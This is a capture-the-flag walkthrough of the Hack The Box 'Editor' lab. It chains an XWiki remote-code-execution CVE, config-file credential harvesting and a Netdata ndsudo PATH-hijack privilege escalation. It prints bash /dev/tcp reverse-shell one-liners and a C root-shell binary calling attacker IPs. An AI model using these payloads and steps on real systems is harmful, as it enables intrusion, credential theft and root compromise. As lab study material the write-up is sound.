
## 1. External Enumeration

### TCP Aggressive Scan

```shell
sudo nmap -A 10.10.11.80 --open -T4
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
| http-methods: Potentially risky methods: PROPFIND LOCK UNLOCK
| http-webdav-scan: Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
```

**Findings / Motivation:**

- Two HTTP services exposed: `80` (main site) and `8080` (Wiki).
    
- Jetty server on `8080` allows uncommon WebDAV methods (`PROPFIND`, `LOCK`, `UNLOCK`), indicating potential for further exploitation.
    

---
### UDP Version Scan (Top 100 ports)

```shell
sudo nmap -sU -sV -F 10.10.11.80 -T4
```

```
No interesting UDP ports; all scanned ports closed or open|filtered
```

---

## 2. Web Enumeration

### Host Configuration

```shell
echo '10.10.11.80 editor.htb' | sudo tee -a /etc/hosts
```

---
### WhatWeb Analysis

```shell
whatweb editor.htb
```

```shell
http://editor.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.80], Script[module], Title[Editor - SimplistCode Pro], nginx[1.18.0]
```

---
### Directory Bruteforcing

```shell
dirb http://editor.htb/
```

Found /assets/ and index.html; nothing interesting

---
### Subdomain Enumeration

```shell
ffuf -u http://10.10.11.80/ -H "Host: FUZZ.editor.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 154
```

Found "wiki" → redirects to port 8080

```
echo '10.10.11.80 wiki.editor.htb' | sudo tee -a /etc/hosts
```

Adding `wiki.editor.htb` to the hosts file allowed access to the XWiki on port 8080.

---
### Application Exploration

Access to http://editor.htb 



![editor_1](https://gianlucabassani.github.io/assets/editor/htb_editor_1.png)


- Downloadable `.deb` file from main site.



![editor_2](https://gianlucabassani.github.io/assets/editor/htb_editor_2.png)



- The application terminal allows execution of system commands (`python`, `git`, `npm`), potentially useful for code execution if installed on the target machine.

---

Access to: http://wiki.editor.htb



![editor_3](https://gianlucabassani.github.io/assets/editor/htb_editor_3.png)

- XWiki version 15.10.8 running on wiki subdomain.



![editor_4](https://gianlucabassani.github.io/assets/editor/htb_editor_4.png)



- Wiki has a login page and provides developer posts hinting at system behavior.

---
## 3. Exploitation

### XWiki RCE (CVE-2025-24893)

- Vulnerable version 15.10.8 identified. (https://www.offsec.com/blog/cve-2025-24893/) 
	
- PoC available at: [GitHub CVE-2025-24893 PoC](https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py)



---
#### Reverse Shell Payload

- Encode reverse shell and insert it into the PoC:



```bash
echo -n 'bash -c '"'"'sh -i >& /dev/tcp/10.10.14.112/4444 0>&1'"'"'' | base64
# YmFzaCAtYyAn... (use in exploit)
```

- Replace exploit_url with the new payload:

![editor_5](https://gianlucabassani.github.io/assets/editor/htb_editor_5.png)



- Start listener:
    

```bash
nc -nvlp 4444
```



- Connection received as user `xwiki`.
    


#### Upgrade TTY

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
stty raw -echo; fg
reset (if needed)
export TERM=xterm
```

```shell
xwiki@editor:/usr/lib/xwiki-jetty$ ls -lah /home
```

```shell
drwxr-x---  6 oliver oliver 4.0K Sep  5 14:44 oliver
```



- Identified user: `oliver`.



---

### Linux Enumeration / Credential Hunting

- `/etc/xwiki` is the **system-wide configuration directory**, readable by `xwiki`.
    
- Search for potential credentials:



```bash
find / -type f -name "*xwiki*" 2>/dev/null | grep -Ei '\.xml$|\.config$|\.cfg$|xml'
```

```bash
<SNIP>
`/etc/xwiki/xwiki.cfg /var/lib/ucf/cache/:etc:xwiki:xwiki.cfg /var/lib/ucf/cache/:etc:xwiki:hibernate.cfg.xml /var/lib/dpkg/info/xwiki-mysql-common.config /usr/share/xwiki/default/xwiki.cfg`
<SNIP>
```



**Significance:**

- `hibernate.cfg.xml` → database connection info.
    
- `xwiki.cfg` → system configuration, may include admin credentials, DB URLs, or LDAP credentials.
    
- `xwiki-mysql-common.config` → stored package configuration, may include DB password.



#### Extract credentials:


```shell
grep -iE 'password|user|username|secret|key|jdbc|db' /etc/xwiki/xwiki.cfg.xml
```



no relevant data.



```bash
grep -iE 'password|user|username|secret|key|jdbc|db' /etc/xwiki/hibernate.cfg.xml
```

```
<property name="hibernate.connection.username">xwiki</property>
<property name="hibernate.connection.password">theEd1t0rTeam99</property>
```


Found credentials:  **xwiki:theEd1t0rTeam99**

---
### SSH Access

- Tested credential reuse for SSH access (only user present: `oliver`):

```bash
ssh oliver@editor.htb
Password: theEd1t0rTeam99
```


- User flag:


```bash
cat /home/oliver/user.txt
# b814815<REDACTED>
```

---
## 4. Privilege Escalation

### System Info

```bash
whoami && id
```

```
oliver
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```


```bash
hostname && uname -a
```

```bash
Linux editor 5.15.0-151-generic #161-Ubuntu SMP Tue Jul 22 14:25:40 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

---
### SUID & Capabilities

```bash
sudo -l
```

```
Sorry, user oliver may not run sudo on editor.
```


```bash
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

```bash
<SNIP>
-rw-r--r-- 1 root root        6860 Apr  1  2024 loopsleepms.sh.inc
-rwsr-x--- 1 root netdata   200576 Apr  1  2024 ndsudo
-rwsr-x--- 1 root netdata  1377624 Apr  1  2024 network-viewer.plugin
-rwsr-x--- 1 root netdata   896448 Apr  1  2024 nfacct.plugin
<SNIP>
```



- Netdata SUID binaries (`ndsudo`, `nvme`, `plugins.d/*`) with capabilities like `cap_dac_read_search` and `cap_sys_ptrace` represent potential vectors for root escalation.

---
### Cron

```bash
ls -la /etc/cron*
crontab -l
```

- `/etc/cron.daily/tomcat9` exists; sources `/etc/default/tomcat9`.
    
- Oliver has no personal crontab; cron not directly exploitable.
    

---
### Local Services

```bash
netstat -lnupt
```

- MySQL: 127.0.0.1:3306
    
- Netdata: 127.0.0.1:19999 ( web interface for Netdata, may allow RCE if misconfigured)

#### Portforward netdata:

```shell
ssh -L 19999:127.0.0.1:19999 oliver@10.10.11.80
Pass: theEd1t0rTeam99
```

Access netdata dashboard: http://127.0.0.1:19999

![editor_6](https://gianlucabassani.github.io/assets/editor/htb_editor_6.png)

- Warning indicates the version is outdated and vulnerable.

- Guide for exploiting ndsudo:  https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93


STEPS:

1. Place an executable with a name that is on `ndsudo`’s list of commands (e.g. `nvme`) in a writable path
2. Set the `PATH` environment variable so that it contains this path
3. Run `ndsudo` with a command that will run the aforementioned executable)

---

### Netdata `ndsudo` Exploit

1. Create malicious binary `nvme.c` on attacker machine:
    

```c
#include <unistd.h>
#include <stddef.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.122/9090 0>&1", NULL);
    return 0;
}
```


2. Compile:
    

```bash
gcc nvme.c -o nvme
```


3. Transfer to target:
    

```bash
scp nvme oliver@10.10.11.80:/tmp/
chmod +x /tmp/nvme
```


4. Set PATH:
    

```bash
export PATH=/tmp:$PATH
```


5. Trigger `ndsudo`:
    

```bash
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

- Root shell received on listener `10.10.14.38:9090`.
    


### Root Flag

```bash
cat /root/root.txt
# ee580de<REDACTED>
```

---

## Conclusions

- **User access:** Achieved via XWiki RCE (CVE-2025-24893) and database credentials.
    
- **Privilege Escalation:** Netdata SUID binaries (`ndsudo`) with capabilities allowed full root.
    
- **Key Lessons:** Outdated software, misconfigured services, and readable sensitive configuration files significantly increased the attack surface, allowing full system compromise.